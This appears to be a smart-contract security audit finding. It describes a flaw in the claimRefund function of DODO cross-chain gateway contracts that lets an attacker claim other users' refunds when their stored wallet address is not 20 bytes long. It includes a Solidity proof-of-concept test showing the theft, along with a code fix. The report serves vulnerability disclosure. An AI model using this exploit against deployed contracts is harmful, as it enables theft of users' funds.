# An attacker can claim refunds on behalf of other users if their wallet addresses are not 20 bytes long

## Vulnerability Details
The `claimRefund` function in both the `GatewayTransferNative` and `GatewayCrossChain` contracts initializes the `receiver` address to `msg.sender`. If the length of `refundInfo.walletAddress` is 20 bytes, the `receiver` is updated to that `walletAddress` ([link to code](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L661)). 

However, if the `walletAddress` is not 20 bytes long, the `receiver` remains as `msg.sender`, and the function proceeds to the `require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER")` check for caller validity.


```solidity
  function claimRefund(bytes32 externalId) external {
      RefundInfo storage refundInfo = refundInfos[externalId];

@>    address receiver = msg.sender;
@>    if(refundInfo.walletAddress.length == 20) {
@>        receiver = address(uint160(bytes20(refundInfo.walletAddress)));
@>    }
@>    require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER");
      
      ...
  }
```
This means that an attacker who knows the `externalId` of a user whose wallet address is not 20 bytes long can potentially call or front-run the `claimRefund` function before the legitimate user, thereby stealing the user's funds.

## POC
In a test bellow `user1` can claim refund of aborted transaction which is not for him. Copy the test bellow to the `GatewayTransferNative.t.sol` file.

```solidity
  function testClaimRefund() public {
      bytes32 externalId = keccak256(abi.encodePacked(block.timestamp));
      uint256 amount = 100 ether;
      token1Z.mint(address(gatewayTransferNative), amount);

      // @ auditor : random bytes22 (not 20)
      bytes22 walletAddress = 0xa3f1c9d2e4b5f7a8c9d0e1f2a3b4c5d6e7f8a9b0c1d2; 

      vm.prank(address(gatewayZEVM));
      gatewayTransferNative.onAbort(
          AbortContext({
              sender: abi.encode(address(this)),
              asset: address(token1Z),
              amount: amount,
              outgoing: false,
              chainID: 7000,
              revertMessage: bytes.concat(externalId, walletAddress)
          })
      );
      uint256 beforeBalance = token1Z.balanceOf(user1);
      vm.prank(user1);
      gatewayTransferNative.claimRefund(externalId);
      
      assertEq(token1Z.balanceOf(user1), amount + beforeBalance);
  }
```
## Impact
Potential loss of funds for users whose wallet addresses are not 20 bytes long, leading to transaction reverts.

## Mitigation
Consider modifying the `claimRefund` function as shown below:

```diff
  function claimRefund(bytes32 externalId) external {
    RefundInfo storage refundInfo = refundInfos[externalId];

-   address receiver = msg.sender;
+   address receiver;
    if(refundInfo.walletAddress.length == 20) {
        receiver = address(uint160(bytes20(refundInfo.walletAddress)));
    }
    require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER");
      
      ...
  }
```
